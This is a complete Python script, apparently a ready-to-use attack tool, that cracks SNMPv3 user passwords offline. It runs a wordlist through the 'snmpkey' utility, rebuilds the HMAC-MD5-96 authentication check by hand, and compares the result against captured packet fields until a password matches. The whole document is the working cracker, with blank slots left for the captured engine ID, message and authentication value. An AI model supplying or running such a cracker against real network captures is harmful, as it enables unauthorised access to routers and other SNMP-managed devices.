#!/usr/bin/env python3

import hashlib
import binascii
import subprocess 

msgAuthenticationParameters = ''
msgAuthoritativeEngineID = ''
wholeMsg = ''

passlist = open('', 'rb').read().splitlines()

for password in passlist:

	result = subprocess.check_output(["snmpkey", "md5", password, msgAuthoritativeEngineID]).decode()
	AK = result.split('\n')[0].split("authKey: 0x")
	authKey = ''.join(AK)

	extendedAuthkey = authKey + '00'*48
	exAK1 = bytearray(binascii.unhexlify(extendedAuthkey))

	ipad = bytearray(binascii.unhexlify('36'*64))
	opad = bytearray(binascii.unhexlify('5c'*64))

	Key1 = binascii.hexlify(bytearray(a ^ b for a, b in zip(exAK1, ipad)))
	Key2 = binascii.hexlify(bytearray(a ^ b for a, b in zip(exAK1, opad)))

	File1 = Key1 + wholeMsg.encode()
	h1 = hashlib.md5(binascii.unhexlify(File1)).hexdigest()

	File2 = Key2 + h1.encode()
	h2 = hashlib.md5(binascii.unhexlify(File2)).hexdigest()

	if msgAuthenticationParameters == h2[:24]:
		print('The Password is found: ' ,password)
		break
